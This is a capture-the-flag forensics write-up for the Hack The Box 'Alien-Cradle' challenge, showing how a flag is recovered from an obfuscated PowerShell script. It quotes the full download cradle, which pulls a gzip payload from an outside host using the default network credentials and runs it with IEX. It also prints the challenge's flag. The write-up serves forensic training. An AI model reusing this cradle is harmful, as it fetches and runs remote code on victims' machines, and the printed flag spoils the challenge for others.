# Alien-Cradle

## FLAG: HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}

## Status: Complete

+ DOCKER: No
+ DOWNLOADABLE: Yyes

Description: In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora's close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it?

## NOTES

1. Extract the content
   1. > unzip forensics_alien_cradle.zip
      1. FILE: cradle.ps1
      2. Lets examine this file
2. CRADLE.PS1
   1. We know that .ps1 means it is a powershell script so we DON"T want to run this!!
   2. Lets looks at the code
      1. > cat cradle.ps1
         1. RESPOSNE:

            ```ps1
                if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();%
            ```

         2. In here we see a specific line where a variable $f is set
            1. `$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}'`
         3. Removing all the quotes, concatenation symbols, etc. We get
            1. `HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}`
